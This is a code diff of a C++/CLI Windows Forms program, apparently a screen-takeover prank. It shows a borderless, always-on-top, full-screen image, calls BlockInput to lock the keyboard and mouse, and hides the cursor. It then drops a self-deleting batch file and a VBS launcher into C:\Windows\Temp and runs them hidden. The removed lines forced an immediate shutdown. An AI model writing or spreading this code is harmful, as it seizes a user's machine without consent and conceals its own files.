@@ -1,4 +1,7 @@
 #include <fstream>
+
+int width;
+int height;
 namespace solver {
 
 	using namespace System;
@@ -22,6 +25,7 @@ namespace solver {
 			//
 		}
 	private: System::Windows::Forms::Timer^ timer1_4;
+	private: System::Windows::Forms::PictureBox^ pictureBox1;
 	public:
 	private: bool first = true;
 	protected:
@@ -56,6 +60,8 @@ namespace solver {
 			this->components = (gcnew System::ComponentModel::Container());
 			System::ComponentModel::ComponentResourceManager^ resources = (gcnew System::ComponentModel::ComponentResourceManager(final::typeid));
 			this->timer1_4 = (gcnew System::Windows::Forms::Timer(this->components));
+			this->pictureBox1 = (gcnew System::Windows::Forms::PictureBox());
+			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->BeginInit();
 			this->SuspendLayout();
 			// 
 			// timer1_4
@@ -63,13 +69,22 @@ namespace solver {
 			this->timer1_4->Interval = 3000;
 			this->timer1_4->Tick += gcnew System::EventHandler(this, &final::timer1_4_Tick);
 			// 
+			// pictureBox1
+			// 
+			this->pictureBox1->BackgroundImage = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox1.BackgroundImage")));
+			this->pictureBox1->BackgroundImageLayout = System::Windows::Forms::ImageLayout::Stretch;
+			this->pictureBox1->Location = System::Drawing::Point(0, 0);
+			this->pictureBox1->Name = L"pictureBox1";
+			this->pictureBox1->Size = System::Drawing::Size(718, 539);
+			this->pictureBox1->TabIndex = 0;
+			this->pictureBox1->TabStop = false;
+			// 
 			// final
 			// 
 			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
 			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
-			this->BackgroundImage = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"$this.BackgroundImage")));
-			this->BackgroundImageLayout = System::Windows::Forms::ImageLayout::Stretch;
 			this->ClientSize = System::Drawing::Size(718, 539);
+			this->Controls->Add(this->pictureBox1);
 			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::None;
 			this->Icon = (cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L"$this.Icon")));
 			this->Name = L"final";
@@ -78,26 +93,40 @@ namespace solver {
 			this->TopMost = true;
 			this->WindowState = System::Windows::Forms::FormWindowState::Maximized;
 			this->Load += gcnew System::EventHandler(this, &final::final_Load);
+			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->EndInit();
 			this->ResumeLayout(false);
 
 		}
 	private: System::Void final_Click() {
 		std::ofstream reboot("C:\\Windows\\Temp\\reboot.bat");
 		if (reboot.is_open())
-			reboot << "@echo OFF\nshutdown /s /t 00\nDEL \"C:\\Windows\\Temp\\reboot.vbs\"\ndel %0";
+			reboot << "@echo OFF\nDEL \"C:\\Windows\\Temp\\reboot.vbs\"\ndel %0";
 		reboot.close();
 		std::ofstream reboot1("C:\\Windows\\Temp\\reboot.vbs");
-		if (reboot1.is_open())
+		if (reboot1.is_open()) {
 			reboot1 << "set sh=CreateObject(\"Wscript.Shell\")\nsh.Run \"C:\\Windows\\Temp\\reboot.bat\", 0";
-		reboot1.close();
-		(gcnew System::Diagnostics::Process())->Start("C:\\Windows\\Temp\\reboot.vbs");
-		Application::Exit();
+			try {
+				reboot1.close();
+				(gcnew System::Diagnostics::Process())->Start("C:\\Windows\\Temp\\reboot.vbs");
+				Application::Exit();
+			}
+			catch (std::exception e) {
+				Application::Exit();
+			}
+		}
+		else {
+			Application::Exit();
+		}
 	}
 	private: System::Void timer1_4_Tick(System::Object^ sender, System::EventArgs^ e) {
 		final_Click();
 	}
 	private: System::Void final_Load(System::Object^ sender, System::EventArgs^ e) {
 		if (this->first) {
+			System::Drawing::Size size = this->ClientSize;
+			width = size.Width;
+			height = size.Height;
+			this->pictureBox1->Size = System::Drawing::Size(width, height);
 			BlockInput(true);
 			SetCursorPos(90000000, 90000000);
 			this->first = false;
